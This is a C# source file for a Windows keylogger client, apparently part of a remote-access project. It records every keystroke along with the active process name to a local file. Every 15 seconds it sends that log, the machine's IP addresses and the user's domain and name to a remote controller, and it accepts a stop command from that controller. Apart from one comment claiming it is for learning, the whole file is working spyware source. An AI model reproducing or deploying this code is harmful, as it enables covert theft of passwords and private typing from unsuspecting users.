﻿using RemotingInterface;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Windows.Input;

namespace Client
{
    internal class Keylogger
    {
        static DesktopInterface dInterface = Desktop.dInterface;

        static string commands;
        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        static System.Timers.Timer timer = new System.Timers.Timer();

        [DllImport("user32.dll")]

        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        
        static string path = "keystrokes.txt";
        
        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        
        static string prevProcessName = activeProcessName;

        static Thread th_RunKeylogger;

        public static void initClientKeylogger()
        {
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine(String.Format("\r\n[--{0}--]", activeProcessName));
                    sw.Close();
                }
            }

            th_RunKeylogger = new Thread(new ThreadStart(RunKeylogger));
            th_RunKeylogger.SetApartmentState(ApartmentState.STA);
            th_RunKeylogger.Start();
        }

        public static void RunKeylogger()
        { 
            while (true)
            {
                Thread.Sleep(5);

                string keyPressed = GetNewPressedKeys();
                Console.Write(keyPressed); // obvs this is only for learning / debugging purposes and would never be used or even seen in a legit deployment

                using (StreamWriter sw = File.AppendText(path))
                {
                    activeProcessName = GetActiveWindowProcessName().ToLower();
                    bool isOldProcess = activeProcessName.Equals(prevProcessName);
                    if (!isOldProcess)
                    {
                        sw.WriteLine(String.Format("\r\n[--{0}--]", activeProcessName));
                        prevProcessName = activeProcessName;
                    }
                    sw.Write(keyPressed);
                    sw.Close();
                }
            }

        }

        public static string GetNewPressedKeys()
        {
            string pressedKey = String.Empty;

            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());

                bool downski = false;

                if (key != Key.None)
                {
                    downski = Keyboard.IsKeyDown(key);
                }

                if (!downski && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (downski && !PressedKeysHistory.Contains(key))
                {
                    if (!isCaps())
                    {
                        Key k = (Key)(new KeyConverter().ConvertFromString((key.ToString()).ToLower()));
                        PressedKeysHistory.Add(k);
                        pressedKey = key.ToString().ToLower();
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString();
                    }
                }
            }
            return replaceStrings(pressedKey);
        }

        private static bool isCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;

            if (isCapsLockOn || isShiftKeyPressed)
                return true;
            else return false;
        }

        private static string replaceStrings(string input)
        {
            string replacedKey = input;
            switch (input)
            {
                case "space":
                case "Space":
                    replacedKey = " ";
                    break;
                case "return":
                    replacedKey = "\r\n";
                    break;
                case "escape":
                    replacedKey = "[ESC]";
                    break;
                case "leftctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "rightctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "RightShift":
                case "rightshift":
                    replacedKey = "";
                    break;
                case "LeftShift":
                case "leftshift":
                    replacedKey = "";
                    break;
                case "back":
                    replacedKey = "[Back]";
                    break;
                case "lWin":
                    replacedKey = "[WIN]";
                    break;
                case "tab":
                    replacedKey = "[Tab]";
                    break;
                case "Capital":
                    replacedKey = "";
                    break;
                case "oemperiod":
                    replacedKey = ".";
                    break;
                case "D1":
                    replacedKey = "!";
                    break;
                case "D2":
                    replacedKey = "@";
                    break;
                case "oemcomma":
                    replacedKey = ",";
                    break;
                case "oem1":
                    replacedKey = ";";
                    break;
                case "Oem1":
                    replacedKey = ":";
                    break;
                case "oem5":
                    replacedKey = "\\";
                    break;
                case "oemquotes":
                    replacedKey = "'";
                    break;
                case "OemQuotes":
                    replacedKey = "\"";
                    break;
                case "oemminus":
                    replacedKey = "-";
                    break;
                case "delete":
                    replacedKey = "[DEL]";
                    break;
                case "oemquestion":
                    replacedKey = "/";
                    break;
                case "OemQuestion":
                    replacedKey = "?";
                    break;
            }

            return replacedKey;
        }

        public static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName;
        }




        private static void onTimedEvent(object sender, EventArgs e)
        {
            try
            {
                dInterface.SendKeystrokes(GetKeystrokes());
                commands = dInterface.GetCommands();
            }
            catch (Exception)
            {
               // Thread.Sleep(5000);
            }

            if (commands.LastIndexOf("StopClient") >= 0)
                Environment.Exit(0);
        }

        static string GetKeystrokes()
        {
            string filePath = "keystrokes.txt";

            string logContents = File.ReadAllText(filePath);
            string messageBody = "";
            string newLine = Environment.NewLine;

            //-- create a  message
            DateTime now = DateTime.Now;

            var host = Dns.GetHostEntry(Dns.GetHostName());

            messageBody += "IP Addresses:" + newLine;
            foreach (var address in host.AddressList)
            {
                messageBody += address + newLine;
            }

            messageBody += newLine + "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\r\n";
            messageBody += "Time: " + now.ToString() + newLine;
            messageBody += newLine + "--- Keystrokes --- " + newLine + logContents;

            return messageBody;
        }
    }
}
